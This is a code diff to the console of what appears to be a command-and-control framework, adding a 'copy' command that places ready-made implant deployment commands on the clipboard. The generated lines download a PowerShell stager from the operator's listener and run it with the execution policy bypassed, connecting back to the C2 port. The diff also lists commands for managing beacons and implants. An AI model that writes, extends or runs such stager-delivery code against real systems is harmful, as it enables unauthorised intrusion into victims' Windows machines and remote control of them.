@@ -16,7 +16,9 @@ import argparse
 import asyncio
 import json
 import logging
+import platform
 import shlex
+import subprocess
 import sys
 import time
 import uuid
@@ -778,6 +780,7 @@ class C4Console(App):
                 "  [cyan]alias <id> <name>[/]    — set a beacon alias\n"
                 "  [cyan]tools[/]                — show available beacon tools\n"
                 "  [cyan]implants[/]             — list available implant instances\n"
+                "  [cyan]copy <implant_id>[/]    — copy fetch+start commands to clipboard\n"
                 "  [cyan]build [options][/]       — build a new implant instance\n"
                 "  [cyan]back[/]                 — exit current session\n"
                 "  [cyan]quit[/]                 — exit console\n"
@@ -805,6 +808,11 @@ class C4Console(App):
             self._set_alias(parts[1], parts[2])
         elif cmd == "implants":
             self._list_implants()
+        elif cmd == "copy":
+            if len(parts) < 2:
+                self._log("[red]Usage: copy <implant_id>[/]")
+                return
+            self._copy_implant_commands(parts[1])
         elif cmd == "build":
             self._build_implant(raw)
         elif cmd == "back":
@@ -993,6 +1001,49 @@ class C4Console(App):
                 )
             self._log(f"    [dim]files: {', '.join(files)}[/]")
         self._log("")
+
+    def _copy_implant_commands(self, implant_id: str) -> None:
+        """Copy fetch+start commands for an implant to the system clipboard."""
+        implants_dir = _C4_DIR / "implants"
+        if not implants_dir.is_dir():
+            self._log("[red]No implants directory found.[/]")
+            return
+        # Match by prefix
+        matches = [
+            d for d in implants_dir.iterdir()
+            if d.is_dir() and d.name.startswith(implant_id)
+        ]
+        if not matches:
+            self._log(f"[red]No implant matching '{implant_id}'[/]")
+            return
+        if len(matches) > 1:
+            self._log(f"[red]Ambiguous — matches: {', '.join(d.name for d in matches)}[/]")
+            return
+        name = matches[0].name
+        ip = getattr(self, "_local_ip", "0.0.0.0")
+        fetch = (
+            f"Invoke-WebRequest -Uri http://{ip}:{self.listen_port}"
+            f"/serve/{name}/rc_stager_full.ps1 -OutFile C:\\temp\\stager.ps1"
+        )
+        start = (
+            f"powershell -ep Bypass -File C:\\temp\\stager.ps1"
+            f" -C2 {ip}:{self.tcp_port}"
+        )
+        text = f"{fetch}\n{start}"
+        try:
+            if platform.system() == "Darwin":
+                subprocess.run(["pbcopy"], input=text.encode(), check=True)
+            elif platform.system() == "Windows":
+                subprocess.run(["clip"], input=text.encode(), check=True)
+            else:
+                subprocess.run(
+                    ["xclip", "-selection", "clipboard"],
+                    input=text.encode(), check=True,
+                )
+            self._log(f"[green]Copied commands for [cyan]{name}[/] to clipboard[/]")
+        except (FileNotFoundError, subprocess.CalledProcessError) as e:
+            self._log(f"[red]Clipboard copy failed:[/] {e}")
+            self._log(f"[dim]{text}[/]")
 
     # -- Build implant ---------------------------------------------------
 
